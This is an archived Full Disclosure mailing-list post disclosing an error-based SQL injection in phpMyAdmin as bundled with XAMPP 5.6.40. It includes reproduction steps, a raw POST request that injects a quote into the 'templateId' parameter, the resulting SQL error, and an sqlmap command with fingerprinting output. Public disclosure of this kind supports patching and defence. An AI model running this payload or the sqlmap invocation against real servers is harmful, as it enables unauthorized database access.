---
title: XAMPP 5.6.40 - Error Based SQL Injection
url: https://seclists.org/fulldisclosure/2024/Mar/7
source: Full Disclosure
date: 2024-03-04
fetch_date: 2025-10-04T12:11:38.006956
---

# XAMPP 5.6.40 - Error Based SQL Injection

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](6)
[By Date](date.html#7)
[![Next](/images/right-icon-16x16.png)](8)

[![Previous](/images/left-icon-16x16.png)](6)
[By Thread](index.html#7)
[![Next](/images/right-icon-16x16.png)](8)

![](/shared/images/nst-icons.svg#search)

# XAMPP 5.6.40 - Error Based SQL Injection

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Wed, 28 Feb 2024 00:59:41 +0000

---

```
# Exploit Title: XAMPP - Error Based SQL Injection
# Date: 02/2024
# Exploit Author: Andrey Stoykov
# Version: 5.6.40
# Tested on: Ubuntu 22.04
# Blog: http://msecureltd.blogspot.com

Steps to Reproduce:

1. Login to phpmyadmin
2. Visit Export > New Template > test > Create
3. Navigate to "Existing Templates"
4. Select template "test" and click "Update"
5. Trap HTTP POST request
6. Place single quote to "templateId" parameter

// HTTP POST request

POST /phpmyadmin/tbl_export.php HTTP/1.1
Host: 192.168.159.128
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
[...]

ajax_request=true&server=1&db=&table=&exportType=server&templateAction=load&templateId=1'&_nocache=170904357625092438&token=%5D%7BwM4%22xq%26%3C%7Fioycy

// HTTP response

HTTP/1.1 200 OK
Date: Tue, 27 Feb 2024 16:44:09 GMT
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
Perl/v5.16.3
X-Powered-By: PHP/5.6.40
[...]

{"success":false,"error":"#1064 - You have an error in your SQL syntax;
check the manual that corresponds to your MariaDB server version for the
right syntax to use near '\\' AND `username` = 'root'' at line 1"}

sqlmap -r request.txt --dbms=mysql --threads 10 --level 5 --risk 3
--fingerprint

[...]
[16:55:00] [INFO] confirming MySQL
[16:55:01] [INFO] the back-end DBMS is MySQL
[16:55:01] [INFO] actively fingerprinting MySQL
[16:55:02] [INFO] executing MySQL comment injection fingerprint
web application technology: PHP 5.6.40, Apache 2.4.37
back-end DBMS: active fingerprint: MySQL >= 5.5
               comment injection fingerprint: MySQL 5.6.52
               fork fingerprint: MariaDB
[...]
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](6)
[By Date](date.html#7)
[![Next](/images/right-icon-16x16.png)](8)

[![Previous](/images/left-icon-16x16.png)](6)
[By Thread](index.html#7)
[![Next](/images/right-icon-16x16.png)](8)

### Current thread:

* **XAMPP 5.6.40 - Error Based SQL Injection** *Andrey Stoykov (Mar 02)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")